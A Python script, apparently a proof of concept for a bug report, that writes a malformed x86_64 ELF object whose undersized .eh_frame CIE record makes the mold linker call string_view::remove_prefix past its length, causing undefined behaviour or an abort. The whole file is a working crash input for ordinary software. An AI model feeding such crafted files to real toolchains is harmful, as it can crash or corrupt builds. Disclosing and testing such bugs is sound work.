#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object with one ".eh_frame" section whose sole CIE record
declares an implausibly small size (size=1, so the record is only 5 bytes: 4-byte size field + 1
payload byte). mold's CieRecord<E>::get_contents() (src/mold.h) returns exactly this 5-byte view
(the two-argument substr(pos, count) clamps but the record is fully in-bounds so it isn't even
triggered). parse_fde_encoding() (src/input-files.cc) then does `u8 version = data[8]` (an
unchecked string_view::operator[] read one byte past the 5-byte view, but still inside the real
mmap'd section - harmless by itself) followed by `data.remove_prefix(9)`, whose documented
precondition is n <= size(); since size() is only 5, this is UB. libstdc++'s implementation does
an unchecked `_M_len -= n` on size_t, underflowing to a huge wrapped value when built with
_GLIBCXX_ASSERTIONS off, or tripping `__glibcxx_assert(this->_M_len >= __n)` -> abort() when
_GLIBCXX_ASSERTIONS is on (mold's own CMakeLists.txt enables this automatically for
CMAKE_BUILD_TYPE=Debug).

Section layout (32 bytes total), all offsets absolute within .eh_frame:
  [0:4)  size field = 1                (declares a 5-byte record)
  [4:8)  0x00000000                    (the outer parse_ehframe() loop reads these 4 bytes as
                                         "id"; id==0 marks this record as a CIE)
  [8]    0x01                          (version byte read by parse_fde_encoding's data[8]; must
                                         be 1 or 3 to pass the version check and reach
                                         remove_prefix(9))
  [9]    0x00                          (NUL - makes the augmentation string empty, in case the
                                         assert is compiled out and execution continues)
  [10:32) zero padding
"""
import struct
import sys


def build() -> bytes:
    eh_frame_data = bytes([
        0x01, 0x00, 0x00, 0x00,  # size = 1
        0x00, 0x00, 0x00, 0x00,  # id = 0 (CIE marker)
        0x01,                    # version = 1
        0x00,                    # NUL terminator for (empty) augmentation string
    ]) + b"\x00" * 22            # padding so the section has plenty of real trailing bytes

    shstrtab = b"\x00.eh_frame\x00.shstrtab\x00"
    name_eh_frame = 1
    name_shstrtab = 1 + len(".eh_frame") + 1

    off_ehframe = 64
    off_shstrtab = off_ehframe + len(eh_frame_data)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    ehdr = (b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8) + struct.pack(
        "<HHIQQQIHHHHHH",
        1,   # e_type = ET_REL
        62,  # e_machine = EM_X86_64
        1,   # e_version
        0,   # e_entry
        0,   # e_phoff
        off_shdrs,  # e_shoff
        0,   # e_flags
        64,  # e_ehsize
        0,   # e_phentsize
        0,   # e_phnum
        64,  # e_shentsize
        3,   # e_shnum
        2,   # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    sh_ehframe = shdr(name_eh_frame, 1, 2, off_ehframe, len(eh_frame_data))  # SHT_PROGBITS, SHF_ALLOC
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))     # SHT_STRTAB

    return ehdr + eh_frame_data + shstrtab + b"\x00" * pad + sh_null + sh_ehframe + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
